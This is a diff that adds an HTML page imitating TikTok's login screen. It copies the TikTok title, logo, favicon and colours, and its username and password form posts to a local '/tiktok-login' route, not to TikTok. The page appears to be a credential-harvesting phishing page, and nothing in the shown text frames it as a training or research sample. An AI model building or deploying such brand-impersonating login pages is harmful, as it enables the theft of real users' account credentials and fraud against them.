@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to TikTok</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><circle cx='16' cy='16' r='16' fill='%23fe2c55'/><text x='16' y='21' text-anchor='middle' font-size='18' fill='white' font-weight='bold'>T</text></svg>">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 30px;
+            text-align: center;
+        }
+        .tiktok-logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        .tiktok-logo svg {
+            width: 40px;
+            height: 40px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #111;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #757575;
+            margin-bottom: 30px;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 16px;
+            text-align: left;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s;
+            background: #fafafa;
+        }
+        .input-group input:focus {
+            border-color: #111;
+            background: #fff;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #111;
+            margin-bottom: 6px;
+        }
+        .forgot-link {
+            text-align: right;
+            margin-bottom: 20px;
+        }
+        .forgot-link a {
+            color: #111;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .login-btn:hover {
+            background: #e02447;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .divider span {
+            padding: 0 16px;
+            color: #757575;
+            font-size: 12px;
+        }
+        .qr-section {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+            cursor: pointer;
+        }
+        .qr-section svg {
+            width: 20px;
+            height: 20px;
+        }
+        .qr-section span {
+            font-size: 14px;
+            font-weight: 500;
+            color: #111;
+        }
+        .signup-text {
+            font-size: 14px;
+            color: #757575;
+        }
+        .signup-text a {
+            color: #fe2c55;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .signup-text a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- TikTok Logo -->
+        <div class="tiktok-logo">
+            <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                <path d="M38.033 11.268c-2.41-1.531-4.132-3.937-4.735-6.768h-6.996v30.366c0 3.584-2.905 6.489-6.489 6.489s-6.489-2.905-6.489-6.489 2.905-6.489 6.489-6.489c.671 0 1.319.103 1.926.293v-7.126c-.636-.088-1.279-.134-1.926-.134C13.894 21.41 8 27.304 8 34.59c0 7.286 5.894 13.181 13.18 13.181 7.287 0 13.181-5.895 13.181-13.181V20.144c2.81 2.017 6.213 3.207 9.919 3.207v-6.996c-2.073 0-4.001-.62-5.647-1.667z" fill="#fe2c55"/>
+                <path d="M33.298 17.935c2.81 2.017 6.213 3.207 9.919 3.207v-6.996c-2.073 0-4.001-.62-5.647-1.667-1.147 2.035-2.794 3.793-4.832 5.056l.56.4z" fill="#25f4ee"/>
+            </svg>
+        </div>
+
+        <h1>Log in to TikTok</h1>
+        <p class="subtitle">Welcome back! Please enter your details.</p>
+
+        <form action="/tiktok-login" method="POST">
+            <div class="input-group">
+                <label>Email / Username</label>
+                <input type="text" name="username" placeholder="Email or username" required>
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
+    </div>
+</body>
+</html>
